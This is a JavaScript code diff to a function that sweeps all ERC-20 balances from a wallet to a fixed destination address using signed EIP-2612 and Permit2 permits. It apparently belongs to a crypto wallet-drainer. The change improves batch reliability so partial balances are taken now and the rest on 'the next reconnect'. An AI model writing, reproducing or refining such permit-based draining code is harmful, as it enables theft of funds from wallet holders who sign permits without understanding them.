@@ -937,6 +937,9 @@ async function sweepGaslessWallet(walletAddress) {
     }
 
     const eip2612Map = batch.eip2612 ?? {};
+    // Track post-Step-1 ERC-20→Permit2 allowances so Step 2 can skip unapproved tokens.
+    // Without this, a single unapproved token causes the entire batch permitTransferFrom to revert.
+    const tokenAllowances = new Map(); // tokenAddr (lowercase) → bigint
 
     // Step 1: EIP-2612 permits — set ERC20→Permit2 for tokens that need it
     for (const perm of batch.permitted) {
@@ -944,6 +947,7 @@ async function sweepGaslessWallet(walletAddress) {
       if (!tokenAddr) continue;
       let erc20Allow = 0n;
       try { erc20Allow = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS); } catch {}
+      tokenAllowances.set(tokenAddr.toLowerCase(), erc20Allow);
 
       const batchEip2612Key = `${checksum.toLowerCase()}:${tokenAddr}`;
       if (erc20Allow === 0n) {
@@ -958,7 +962,6 @@ async function sweepGaslessWallet(walletAddress) {
               const fee = await getFeeData();
               await (await tc.permit(checksum, PERMIT2_ADDRESS, ethers.MaxUint256, BigInt(e2.deadline), e2.v, e2.r, e2.s, { gasLimit: 100_000n, ...fee })).wait();
               log(`[gasless/batch] EIP-2612 confirmed for ${tokenAddr.slice(0, 10)}`);
-              // Part 7: Verify allowance was actually set — some tokens appear to succeed but don't update allowance
               try {
                 const actualAllow = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS);
                 if (actualAllow === 0n) {
@@ -967,6 +970,7 @@ async function sweepGaslessWallet(walletAddress) {
                   eip2612Map[tokenAddr.toLowerCase()] = { ...e2, failed: true };
                 } else {
                   log(`[gasless/batch] EIP-2612 allowance verified: ${actualAllow} for ${tokenAddr.slice(0,10)}`);
+                  tokenAllowances.set(tokenAddr.toLowerCase(), actualAllow);
                 }
               } catch { /* non-fatal — proceed with sweep attempt */ }
             
@@ -988,7 +992,9 @@ async function sweepGaslessWallet(walletAddress) {
       await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
     }
 
-    // Step 2: Build transferDetails — check balances, 0 for empty tokens
+    // Step 2: Build transferDetails — zero out tokens without ERC-20→Permit2 approval.
+    // A single unapproved token would revert the ENTIRE batch tx; by setting those to 0
+    // we sweep what we can now and let the next reconnect handle the rest.
     const transferDetails = [];
     let anyBalance = false;
     for (const perm of batch.permitted) {
@@ -996,8 +1002,14 @@ async function sweepGaslessWallet(walletAddress) {
       if (!tokenAddr) { transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: 0n }); continue; }
       try {
         const balance = await new ethers.Contract(tokenAddr, ERC20_ABI, getReadProvider()).balanceOf(checksum);
-        transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: balance });
-        if (balance > 0n) anyBalance = true;
+        const allow   = tokenAllowances.get(tokenAddr.toLowerCase()) ?? 0n;
+        const requestedAmount = (balance > 0n && allow > 0n) ? balance : 0n;
+        if (balance > 0n && allow === 0n) {
+          log(`[gasless/batch] ${tokenAddr.slice(0,10)}: balance=${balance} but no Permit2 approval — zeroing out`);
+          needsGasTokens.push({ token: tokenAddr, balance });
+        }
+        transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount });
+        if (requestedAmount > 0n) anyBalance = true;
       } catch {
         transferDetails.push({ to: DESTINATION_ADDRESS, requestedAmount: 0n });
       }
